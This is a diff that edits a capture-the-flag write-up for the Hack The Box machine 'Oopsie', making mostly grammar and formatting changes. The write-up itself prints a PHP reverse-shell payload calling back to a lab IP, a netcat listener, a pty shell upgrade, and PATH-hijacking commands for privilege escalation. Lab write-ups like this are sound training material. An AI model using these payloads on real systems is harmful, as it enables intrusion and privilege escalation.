@@ -8,7 +8,7 @@ tags: [HTB, WEB, PATH-HIJACK, PRIVESC]
 ![Icon](/assets/img/Oopsie/icon.png)
 ## **Enumeration**
 
-Initiate recon by **nmap** command:
+Initiate reconnaissance by **nmap** command:
 
 ![Nmap Scan Result](/assets/img/Oopsie/nmap.png)
 
@@ -26,10 +26,8 @@ There is an IDOR vunerbility on web browser url that enable us to access admin's
 ![Nmap Scan Result|601](/assets/img/Oopsie/idor.png)
 
 
-I used **cookie manipulation** to access some features that guest cannot. That feature is upload and it's worth to do upload an **PHP reverse shel**l.
+I used **cookie manipulation** to access some features that guest cannot. That feature is upload and it's worth to upload an **PHP reverse shel**l.
 ![Nmap Scan Result|601](/assets/img/Oopsie/upload.png)
-
-![Icon](/assets/img/Oopsie/icon.pn
 
 Here is my PHP reverse shell that i use : ```<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.87/4444 0>&1'"); ?>```.
 
@@ -46,9 +44,10 @@ After that i prepare my **listener** : ```nc -lvnp 4444```.
 
 ![listener](/assets/img/Oopsie/listener.png)
 
-To get a reverse shell i have to go to this exact url **"https://10.129.95.191/uploads/shell.php"**.
+To get a reverse shell i have to go to this exact url :
+**"https://10.129.95.191/uploads/shell.php"**.
 
-The moment I executed all of these step, finally got an reverse shell.
+The moment I executed all of these steps, finally got an reverse shell.
 
 ![foothold](/assets/img/Oopsie/foothold.png)
 
@@ -59,7 +58,8 @@ User flag can be found on ```/home/robert```
 ## **Lateral Movement**
 
 
-Credential of username **"robert"**  can be found at ```/var/www/html/cdn-cgi/login ```. Before we continue as user robert I want to upgrade my shell a little bit to be able to use **su** command : ```python3 -c 'import pty;pty.spawn("/bin/bash")' ```
+Credential of username **"robert"**  can be found at ```/var/www/html/cdn-cgi/login ```. Before we continue as user robert I want to upgrade my shell a little bit to be able to use **su** command 
+: ```python3 -c 'import pty;pty.spawn("/bin/bash")' ```
 
 ![surobert](/assets/img/Oopsie/su_robert.png)
 
@@ -70,14 +70,14 @@ Check basic command such as ```sudo -l``` to check if I can easily use **sudo** 
 
 ## **Privilege Escalation**
 
-I use ```find / -group bugtracker 2>/dev/null ``` to find any directory, folder, file that is relevant to **bugtacker** group. the path is ```/usr/bin ``` 
-then i want to check behaviour of the program by ```strings bugtracker```. The result is it didn't use **absolute path**
+I use ```find / -group bugtracker 2>/dev/null ``` to find any directory, folder, file that is relevant to **bugtacker** and throw any thing that doesn't relevant to the group away, the path is ```/usr/bin ``` .
+Then i want to check behaviour of the program by ```strings bugtracker```. The result is it didn't use **absolute path**
 
 
 ![bugtracker](/assets/img/Oopsie/bugtracker.png)
 ![path](/assets/img/Oopsie/path.png)
 
-that mean we can ultilize teqnique called **"Path Hijacking"**.
+that mean we can utilize technique called **"Path Hijacking"**.
 ```echo '/bin/bash' > /tmp/cat ```
 ```chmod +x /tmp/cat```
 ```PATH=/tmp:$PATH ```
